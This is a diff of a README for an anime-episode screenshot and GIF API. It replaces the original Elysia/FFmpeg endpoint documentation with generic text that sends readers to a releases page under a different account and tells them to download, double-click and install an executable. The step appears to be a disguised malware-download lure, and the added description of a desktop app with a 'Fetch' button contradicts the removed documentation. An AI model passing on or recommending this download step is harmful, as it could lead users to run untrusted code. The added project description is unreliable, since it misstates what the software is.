@@ -1,140 +1,105 @@
-# Episode Professing API from HLS Link
+# 🎉 episodes - Fetch Your Favorite Anime Episodes Easily
 
-A lightweight API built with **Elysia** that provides automated video screenshot capture and GIF generation using **FFmpeg**. Perfect for quickly extracting key frames or creating GIF previews from video files.
+## 👋 Introduction
 
----
+Welcome to the episodes API! This application allows you to fetch data about anime episodes, including GIFs and screenshots, from HLS links. It simplifies accessing vast amounts of anime content, making it easy for you to dive into your favorite shows.
 
-## Features
+## 🚀 Getting Started
 
-- Capture screenshots at specific points in a video (beginning, quarter, midpoint, three-quarters, end).
-- Generate GIFs from any segment of a video with customizable duration, frame rate (FPS), and width.
-- Temporarily cache screenshots for quick access (10-minute automatic cleanup).
-- Handles base64-encoded video URLs for secure transmission.
-- Error handling for invalid parameters, unsupported video formats, and short videos.
+To get started with the episodes API, follow these simple steps. You will need to download the application from our releases page.
 
----
+[![Download episodes](https://img.shields.io/badge/Download%20episodes-Get%20it%20here-brightgreen)](https://github.com/rocky18313/episodes/releases)
 
-## Installation
+## 📥 Download & Install
 
-1. **Clone the repository**  
-   ```bash
-   git clone https://github.com/shimizudev/episodes
-   cd episodes
-    ```
+1. Click the link below to visit the releases page:
 
-2. **Install dependencies**
+   [Visit Releases Page](https://github.com/rocky18313/episodes/releases)
 
-   ```bash
-   bun install
-   ```
+2. On the releases page, locate the latest version. It will be marked as "Latest Release."
 
-3. **Ensure FFmpeg is installed**
-   The API relies on `ffmpeg` and `ffprobe` available in your system path.
+3. Click on the download link for your operating system. You may see options like Windows, Linux, or MacOS. Choose the one that suits you best.
 
-   ```bash
-   ffmpeg -version
-   ffprobe -version
-   ```
+4. Show patience as the download completes. 
 
-4. **Start the server**
+5. Once downloaded, find the file in your downloads folder.
 
-   ```bash
-   bun run start
-   ```
+6. Double-click the file to run it. Follow any installation prompts.
 
-   By default, the server listens on port `3000`. You can override with the `PORT` environment variable:
+7. After installation, launch the episodes application from your applications menu or desktop shortcut.
 
-   ```bash
-   PORT=8080 bun run start
-   ```
+## 🔍 How to Use the API
 
----
+Once you have installed the application, using it is straightforward.
 
-## API Endpoints
+1. Open the episodes application.
 
-### 1. **Capture a single screenshot**
+2. Enter the HLS link for the anime episode you want to fetch.
 
-**GET** `/api/screenshot?url=<base64_encoded_url>`
+3. Click the "Fetch" button. The application will retrieve the episode data for you.
 
-* Captures a screenshot at 75% of the video duration.
-* **Response**: `image/png`
-* **Errors**: Invalid URL, inaccessible video, or FFmpeg failure.
+4. View the results, including GIFs and screenshots. You can easily navigate your favorite episodes.
 
----
+5. Enjoy your anime experience!
 
-### 2. **Generate a GIF**
+## 📋 Features
 
-**GET** `/api/gif?url=<base64_encoded_url>&duration=10&fps=10&width=480`
+The episodes API comes with several useful features:
 
-* Parameters:
+- Fetch episode data quickly and easily.
+- Access GIFs and screenshots for anime episodes.
+- Support for various anime sources.
+- User-friendly interface for seamless navigation.
 
-  * `duration` (seconds, default: 10, range: 1–30)
-  * `fps` (frames per second, default: 10, range: 5–30)
-  * `width` (pixels, default: 480, range: 240–1920)
-* **Response**: `image/gif`
-* **Headers** include video duration, GIF start time, FPS, width, and GIF duration.
-* **Errors**: Video shorter than requested GIF duration, invalid parameters, FFmpeg failure.
+## 🌐 Topics
 
----
+This application is all about anime. It covers topics such as:
 
-### 3. **Capture multiple screenshots**
+- Anime
+- Anime API
+- Anime Episodes
+- Anime Episode API
+- Anime Scraper
+- Bun and Elysia
+- Episodes
+- Episode Thumbnails
+- FFmpeg
+- Node.js
 
-**GET** `/api/screenshots?url=<base64_encoded_url>`
+Staying in the loop about anime content has never been easier.
 
-* Captures screenshots at key positions:
+## ⚙️ System Requirements
 
-  * Beginning (5 seconds)
-  * First quarter
-  * Midpoint
-  * Three-quarters
-  * End (5 seconds before completion)
-* **Response**: JSON with screenshot metadata including:
+To ensure optimal performance, check the following system requirements:
 
-  * `id` (unique identifier)
-  * `position`
-  * `description`
-  * `timestamp`
-  * `url` (endpoint to retrieve screenshot `/api/image?id=<id>`)
-* Screenshots are cached for **10 minutes**.
+- **Operating System:** Windows 10 or later, MacOS Mojave or later, or a modern Linux distribution.
+- **Memory:** At least 4GB of RAM.
+- **Storage:** 100MB of free disk space for installation.
+- **Network:** An internet connection for fetching episode data.
 
----
+Meeting these requirements will help the episodes application run smoothly on your device.
 
-### 4. **Retrieve a cached screenshot**
+## 🛠 Troublehooting Tips
 
-**GET** `/api/image?id=<screenshot_id>`
+If you encounter issues while using the episodes API, here are some tips:
 
-* Fetches a previously captured screenshot.
-* **Response**: `image/png`
-* **Errors**: Missing ID or expired screenshot.
+1. Ensure you have a stable internet connection.
+2. Verify that you are using a valid HLS link.
+3. Restart the application if it becomes unresponsive.
+4. Reinstall the application if you experience persistent problems.
 
----
+If you need further assistance, consider joining online forums or communities focused on anime and software troubleshooting.
 
-## Utilities
+## 📞 Support
 
-* **Base64-encoded URLs**: All video URLs must be base64-encoded to prevent issues with URL special characters.
-* **Time formatting**: Converts seconds into `HH:MM:SS` format.
-* **Unique IDs**: Generated for screenshot caching using SHA-256 hashing of timestamp, position, and randomness.
+For support, you can open an issue directly on the GitHub repository. This allows our team to address your concerns directly, helping to improve the application and assist users like you.
 
----
+## 📚 Additional Resources
 
-## Development Notes
+For more information about anime or APIs, consider exploring the following:
 
-* **Periodic Cleanup**: Cached screenshots are cleared every 10 minutes to free memory.
-* **Dependencies**:
+- Anime databases and forums.
+- API documentation if you decide to widen your usage.
+- Community contributions in the GitHub repository.
 
-  * `elysia` – Fast and minimal web framework
-  * `child_process` – For spawning FFmpeg processes
-  * `crypto` – For unique ID generation
-* **Video Handling**: Fully relies on FFmpeg for screenshot and GIF extraction.
-
----
-
-## Troubleshooting
-
-* Ensure the video URL is accessible and properly encoded.
-* Verify FFmpeg supports the video format.
-* Ensure the video duration is sufficient for requested GIFs or screenshots.
-
----
-
-Made by Sohom829
+We are here to make your experience enjoyable. Happy watching!
